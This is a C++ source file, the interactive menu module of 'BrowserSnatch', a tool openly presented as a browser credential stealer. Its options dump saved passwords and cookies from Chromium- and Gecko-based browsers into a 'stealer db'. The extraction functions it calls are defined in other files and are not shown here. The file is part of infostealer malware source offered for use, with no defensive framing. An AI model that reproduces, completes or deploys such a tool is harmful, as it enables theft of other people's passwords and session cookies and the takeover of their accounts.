#include "includes/Visualizer.h"
#include "includes/ChromiumParser.h"
#include "includes/GeckoParser.h"

Visualizer::Visualizer()
{}

Visualizer::~Visualizer()
{}

Visualizer::Visualizer(const std::string& converted_username, const std::string& stealer_db)
{
    this->converted_username = converted_username;
    this->stealer_db = stealer_db;
}

// Function to start the visualization
void Visualizer::visualization_main() {
    int choice;
    do {
        printMenu(); // Display the menu
        std::cout << "\n\033[1;34mChoose an option to proceed (0-5): \033[0m";
        std::cin >> choice;

        handleUserChoice(choice); // Handle the user's choice

        if (choice != 0) {
            std::cout << "\nPress Enter to continue...";
            std::cin.ignore();  // Consume newline character left by cin
            std::cin.get();     // Wait for Enter key
        }
    } while (choice != 0);
}

// Function to clear the console
void Visualizer::clearConsole() {
    system("cls");
}

// Function to print a stylized divider
void Visualizer::printDivider(char ch, int length) {
    std::cout << std::string(length, ch) << std::endl;
}

// Function to print the menu
void Visualizer::printMenu() {
    clearConsole();
    printDivider('=', 75);
    std::cout << "    \033[1;32mBrowserSnatch\033[0m - All in one Browser Data Extraction Tool © shaddy43" << std::endl;
    printDivider('=', 75);
    std::cout << "\n \033[1;36m[1]\033[0m Snatch Chromium Based Browser Passwords" << std::endl;
    std::cout << " \033[1;36m[2]\033[0m Snatch Gecko Based Browser Passwords" << std::endl;
    std::cout << " \033[1;36m[3]\033[0m Snatch Chromium Based Browser Cookies" << std::endl;
    std::cout << " \033[1;36m[4]\033[0m Snatch Gecko Based Browser Cookies" << std::endl;
    std::cout << " \033[1;36m[5]\033[0m Snatch Everything {default settings}" << std::endl;
    std::cout << " \033[1;31m[0]\033[0m Exit" << std::endl;
    printDivider('=', 75);
}

BOOL Visualizer::default_settings(std::string converted_username, std::string stealer_db)
{
    if (!chromium_parser(converted_username, stealer_db))
        std::cout << "Chromium Browsers dump failed!" << std::endl;

    if (!gecko_parser(converted_username, stealer_db))
        std::cout << "Gecko Browsers dump failed!" << std::endl;

    if (!gecko_cookie_collector(converted_username, stealer_db))
        std::cout << "Gecko Cookie Collector failed!" << std::endl;

    if (!chromium_cookie_collector(converted_username, stealer_db))
        std::cout << "Chromium Cookie Collector failed!" << std::endl;

    if (std::filesystem::exists(stealer_db)) {
        std::cout << "Stealer db saved: " << stealer_db << std::endl;
        return true;
    }
    else {
        return false;
    }
}

// Function to handle the user's choice
void Visualizer::handleUserChoice(int choice) {
    switch (choice) {
    case 1:
        std::cout << "\n\033[1;33m>> Snatching Chromium Passwords...\033[0m" << std::endl;
        if (!chromium_parser(converted_username, stealer_db))
            std::cerr << "Chromium Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 2:
        std::cout << "\n\033[1;33m>> Snatching Gecko Passwords...\033[0m" << std::endl;
        if (!gecko_parser(converted_username, stealer_db))
            std::cerr << "Gecko Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 3:
        std::cout << "\n\033[1;33m>> Snatching Chromium Cookies...\033[0m" << std::endl;
        if (!chromium_cookie_collector(converted_username, stealer_db))
            std::cerr << "Chromium Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 4:
        std::cout << "\n\033[1;33m>> Snatching Gecko Cookies...\033[0m" << std::endl;
        if (!gecko_cookie_collector(converted_username, stealer_db))
            std::cerr << "Gecko Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 5:
        std::cout << "\n\033[1;33m>> Snatching Everything {default settings}...\033[0m" << std::endl;
        if (!default_settings(converted_username, stealer_db))
            std::cerr << "BrowserSnatch executed with {default settings}" << std::endl;
        break;
    case 0:
        std::cout << "\n\033[1;31mExiting BrowserSnatch. Goodbye!\033[0m" << std::endl;
        break;
    default:
        std::cout << "\n\033[1;31mInvalid choice! Please try again.\033[0m" << std::endl;
    }
}
